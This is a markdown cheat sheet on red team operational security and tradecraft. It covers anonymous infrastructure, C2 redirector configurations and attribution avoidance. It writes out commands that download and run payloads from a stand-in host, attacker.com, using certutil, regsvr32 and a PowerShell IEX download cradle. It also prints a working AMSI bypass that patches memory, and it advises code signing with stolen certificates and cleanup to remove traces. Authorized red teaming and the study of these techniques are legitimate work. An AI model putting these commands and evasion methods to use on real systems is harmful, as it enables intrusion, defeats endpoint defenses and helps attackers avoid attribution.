# Red Team OPSEC and Tradecraft

> Operational security principles and techniques for red team engagements.

---

## OPSEC Principles

1. **Compartmentalization** — Separate infrastructure, credentials, and identities per operation
2. **Need-to-Know** — Limit knowledge of operation details to essential personnel
3. **Cover for Action** — Have plausible explanations for all activities
4. **Cover for Status** — Maintain consistent cover identity
5. **Minimize Detection Signature** — Avoid patterns that trigger alerts
6. **Rapid Recovery** — Plan for compromise and have fallback options

---

## Infrastructure Setup

### Domain Registration
- Use privacy protection
- Register with non-attributable payment methods
- Age domains before use (aged domains have better reputation)
- Use different registrars per operation

### C2 Infrastructure
```
C2 Architecture Options:
1. Direct: Agent -> C2 Server
2. Redirector: Agent -> Redirector -> C2 Server
3. CDN Fronting: Agent -> CDN -> C2 Server
4. Domain Fronting: Agent -> CDN -> C2 Server (with fake Host header)
5. Peer-to-Peer: Agent -> Peer -> C2 Server
```

### Redirectors
```bash
# Apache mod_rewrite redirector
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/api/v1/updates [NC]
RewriteRule ^.*$ http://c2.internal/$1 [P,L]

# Nginx reverse proxy
location /api/v1/updates {
    proxy_pass http://c2.internal;
    proxy_set_header Host $host;
}

# Socat redirector
socat TCP4-LISTEN:443,fork TCP4:c2.internal:443
```

### Domain Fronting (Deprecated but concept)
- Use CDN with multiple custom domains
- Agent connects to CDN with SNI = legitimate domain
- HTTP Host header = C2 domain
- CDN routes to C2 server

---

## Payload Delivery Techniques

### Living Off The Land (LotL)
- Use built-in Windows/Linux tools
- No external binaries needed
- Blends with normal activity

### LOLBAS (Living Off The Land Binaries and Scripts)
```powershell
# Common LOLBAS techniques
# Download with certutil
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe

# Execute with mshta
mshta.exe javascript:close(new ActiveXObject("WScript.Shell").Run("calc.exe"));

# Execute with rundll32
rundll32.exe shell32.dll,Control_RunDLL payload.dll

# Execute with regsvr32
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

### Fileless Execution
```powershell
# Reflective DLL injection
# Process hollowing
# .NET in-memory execution
# PowerShell in-memory execution
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

---

## Evasion Techniques

### AMSI Bypass
```powershell
# Memory patch AMSI
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
$b.SetValue($null, [IntPtr]::Zero)
```

### ETW Bypass
```powershell
# Patch ETW (Event Tracing for Windows)
# Similar approach to AMSI bypass
```

### CLM Bypass (Constrained Language Mode)
```powershell
# Use .NET reflection
# Use COM objects
# Use custom runspace
```

### Signature Evasion
- Packing/encryption
- Polymorphism
- Metamorphism
- Code signing with stolen/compromised certificates

---

## Attribution Avoidance

1. **Don't reuse infrastructure** across operations
2. **Use unique TTPs** per operation (don't create patterns)
3. **Timestamp analysis** — align with target timezone
4. **Language/locale artifacts** — match target region
5. **Tool customization** — modify default tool signatures
6. **Clean up** — remove all traces post-operation

---

## Communication Security

- Encrypted C2 channels (HTTPS, DNS over HTTPS)
- Jitter in beacon intervals
- Randomized user-agents
- Domain generation algorithms (DGA)
- Dead drop resolvers (DDR)
- Fast-flux DNS

---

## Detection Evasion Timeline

| Phase | Technique | Detection Risk |
|---|---|---|
| Initial Access | Phishing with legitimate domain | Low |
| Execution | LOLBAS / Fileless | Very Low |
| Persistence | WMI event subscription | Low |
| Privilege Escalation | Token impersonation | Medium |
| Defense Evasion | AMSI/ETW bypass | High if detected |
| Credential Access | DCSync | Medium |
| Discovery | Native commands | Very Low |
| Lateral Movement | Pass-the-Hash | Low |
| Collection | Native file access | Very Low |
| Exfiltration | HTTPS with legitimate domain | Low |
